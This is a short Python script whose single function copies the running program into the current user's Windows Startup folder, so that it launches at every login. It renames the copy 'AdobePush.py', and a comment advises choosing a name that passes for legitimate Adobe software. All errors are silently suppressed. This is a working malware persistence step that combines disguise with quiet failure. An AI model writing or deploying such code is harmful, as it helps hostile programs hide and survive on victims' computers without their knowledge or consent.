import os, sys
import platform
import getpass
import shutil

#Function to copy the exe to startup
def startupFunc():
	try:
		user_name = getpass.getuser()
		current_directory = os.getcwd() 
		fileName = sys.argv[0].split("\\")[-1]
		copiedName = 'AdobePush.py' #Change to something else like AdobePush
		copyToStartup = 'C://Users//' + user_name + '//AppData//Roaming//Microsoft//Windows//Start Menu//Programs//Startup//'
		copyFromProject = current_directory + os.sep + fileName

		files = os.listdir(copyToStartup)

		if copiedName not in files:
			try:
				shutil.copy2(copyFromProject, copyToStartup + copiedName)
			except Exception:
				pass
	except Exception:
		pass
	return True

